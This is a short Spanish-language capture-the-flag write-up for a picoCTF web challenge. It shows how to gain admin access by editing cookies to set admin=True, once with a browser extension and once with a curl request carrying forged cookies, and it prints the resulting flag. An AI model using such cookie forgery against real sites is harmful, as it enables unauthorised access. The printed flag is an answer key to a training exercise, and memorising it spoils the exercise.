## Descripción
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/15796/` ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:15796
## Solución
### Solución 1
Usé la extensión cookie - editor para ver las cookies del admin, Cambié el valor a True y recargué la página

### Solución 2
```
┌──(anton㉿anton)-[~]
└─$ curl -X GET https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: username=admin; password=admin; admin=True" | grep -s picoCTF
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--    100  1312  100  1312    0     0   2536      0 --:--:-- --:--:-- --:--:--  2537
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}</code></p>

┌──(anton㉿anton)-[~]
```
## Notas
## Referencias